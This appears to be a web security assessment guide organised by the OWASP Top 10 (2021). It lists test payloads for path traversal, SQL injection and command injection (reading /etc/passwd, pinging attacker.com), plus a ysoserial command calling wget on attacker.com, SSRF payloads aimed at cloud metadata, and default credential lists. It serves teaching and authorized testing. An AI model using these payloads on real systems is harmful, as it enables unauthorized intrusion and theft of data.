# OWASP Top 10 (2021 Edition) - Enterprise Assessment Guide

## A01:2021 – Broken Access Control

### Detection Patterns
- **IDOR (Insecure Direct Object Reference)**
  - Test URL parameters: `/api/user/123` → `/api/user/124`
  - Check sequential IDs, UUIDs, encoded values
  - Look for: unauthorized data access, privilege escalation

- **Path Traversal**
  ```
  ?file=../../../../etc/passwd
  ?path=..%2F..%2F..%2Fetc%2Fpasswd
  ?doc=....//....//etc/passwd
  ```

- **Forced Browsing**
  - Access admin panels: `/admin`, `/administrator`, `/wp-admin`
  - API endpoints without auth: `/api/admin/*`, `/api/internal/*`

### Exploitation Strategy
1. Map all endpoints with different privilege levels
2. Test horizontal privilege escalation (user A → user B)
3. Test vertical escalation (user → admin)
4. Check for missing function-level access control

---

## A02:2021 – Cryptographic Failures

### Detection Patterns
- **Weak TLS Configuration**
  ```bash
  # Check with sslscan or testssl.sh
  TLS 1.0/1.1 enabled = CRITICAL
  Weak ciphers (RC4, DES) = HIGH
  Missing HSTS header = MEDIUM
  ```

- **Sensitive Data Exposure**
  - Plaintext passwords in responses/cookies
  - API keys in JavaScript/source code
  - Database credentials in config files
  - JWT secrets in client-side code

### Tools
- `sslscan`, `testssl.sh` for TLS analysis
- `truffleHog` for secret detection in repos
- Browser DevTools for credential leakage

---

## A03:2021 – Injection (SQL, Command, LDAP, etc.)

### SQL Injection
```sql
-- Classic boolean-based blind
' OR '1'='1
' OR 1=1--
' OR 1=1#

-- Time-based blind
' OR SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--

-- Union-based
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT user(),database(),version()--

-- Error-based
' AND 1=CONVERT(int,(SELECT @@version))--
```

**Detection Indicators:**
- `SQL syntax error`
- `mysql_fetch_array()` warnings
- `ORA-00933` Oracle errors
- Database-specific error messages

### Command Injection
```bash
; ls -la
| cat /etc/passwd
`whoami`
$(cat /etc/hosts)
; ping -c 4 attacker.com
```

**Detection Indicators:**
- `uid=` in response (command executed)
- `/etc/passwd` contents
- `sh-4.2$` shell prompt
- DNS requests to external domains (blind)

---

## A04:2021 – Insecure Design

### Anti-Patterns to Detect
- **Unlimited Rate Limiting**
  - Brute force login endpoints
  - SMS/OTP bombing
  - Resource exhaustion

- **Business Logic Flaws**
  - Negative prices/quantities in e-commerce
  - Race conditions in payment processing
  - Replay attacks on transactions

### Assessment Approach
1. Review authentication flow for logic errors
2. Test account recovery mechanisms
3. Check for race conditions (parallel requests)
4. Validate business constraints (price, quantity, role)

---

## A05:2021 – Security Misconfiguration

### Quick Wins
```bash
# Directory listing enabled
curl https://target.com/backup/
curl https://target.com/.git/

# Default credentials
admin:admin
administrator:password
root:root

# Unnecessary HTTP methods
OPTIONS, PUT, DELETE, TRACE enabled

# Information disclosure
X-Powered-By: PHP/7.2.34
Server: Apache/2.4.41
Debug mode enabled (stack traces visible)
```

### Automated Detection
- Nikto, Nuclei templates for misconfigurations
- Check for exposed `.env`, `.git`, `config.php`
- Look for CORS misconfiguration: `Access-Control-Allow-Origin: *`

---

## A06:2021 – Vulnerable and Outdated Components

### Identification
```bash
# Wappalyzer for version detection
# Check CVEs for identified versions
searchsploit <component> <version>
```

### Critical Components to Check
- Web servers (Apache, Nginx, IIS)
- Frameworks (Laravel, Django, Express.js)
- Libraries (jQuery, Bootstrap, React)
- CMS (WordPress, Drupal, Joomla)

**Focus on:**
- Known RCE vulnerabilities (CVE search)
- Deserialization bugs
- Prototype pollution (JavaScript)

---

## A07:2021 – Identification and Authentication Failures

### Common Weaknesses
```python
# Weak password policy
passwords = ["password", "123456", "admin", "letmein"]

# Predictable session tokens
PHPSESSID=1234567890
session=user123_timestamp

# Missing MFA
# No account lockout after failed attempts
```

### Test Cases
1. Brute force login (100 attempts)
2. Check password reset token predictability
3. Test session fixation/hijacking
4. Verify JWT signature validation
5. Check for default credentials

---

## A08:2021 – Software and Data Integrity Failures

### Deserialization Attacks
```python
# Python pickle RCE
import pickle
payload = pickle.dumps(os.system, 0)

# PHP unserialize()
O:8:"MyObject":1:{s:3:"cmd";s:6:"whoami";}

# Java deserialization
ysoserial CommonsCollections1 "wget http://attacker.com"
```

**Detection:**
- Look for `unserialize()`, `pickle.loads()`, `readObject()`
- Check cookies/parameters for serialized objects
- Base64-decode suspicious inputs

---

## A09:2021 – Security Logging and Monitoring Failures

### What to Look For
- No rate limiting on critical endpoints
- Verbose error messages in production
- Lack of audit logs for sensitive operations
- No alerting on suspicious activities

**This is a DETECTION issue, not exploitation.**

---

## A10:2021 – Server-Side Request Forgery (SSRF)

### Payloads
```bash
# Internal network scan
http://127.0.0.1:22
http://127.0.0.1:3306
http://169.254.169.254/latest/meta-data/  # AWS metadata

# Bypass filters
http://127.1
http://[::1]
http://localhost.localtest.me
http://spoofed.burpcollaborator.net
```

### Detection Indicators
- Connection timeouts (port scanning)
- Error messages revealing internal IPs
- Response times varying by port/service
- Access to cloud metadata endpoints

---

## Enterprise Assessment Workflow

1. **Reconnaissance** (5 mins)
   - Wappalyzer, Nmap, DNS enumeration
   - Identify technology stack

2. **Authentication Testing** (10 mins)
   - Default credentials, weak passwords
   - JWT/session token analysis
   - MFA bypass techniques

3. **Injection Testing** (15 mins)
   - SQL injection (all inputs)
   - Command injection (file uploads, URLs)
   - XSS (reflected, stored, DOM-based)

4. **Authorization Testing** (10 mins)
   - IDOR, privilege escalation
   - Forced browsing

5. **Configuration Review** (10 mins)
   - Directory listing, exposed files
   - CORS, CSP, security headers
   - Information disclosure

**Total assessment time: ~50 minutes**

---

## Severity Classification (CVSS-based)

| CVSS Score | Severity | Examples |
|------------|----------|----------|
| 9.0-10.0   | CRITICAL | Unauthenticated RCE, SQL injection with data exfil |
| 7.0-8.9    | HIGH     | Authenticated RCE, authentication bypass |
| 4.0-6.9    | MEDIUM   | IDOR, stored XSS, information disclosure |
| 0.1-3.9    | LOW      | Self-XSS, minor info leak |

---

## References
- OWASP Top 10 2021: https://owasp.org/Top10/
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
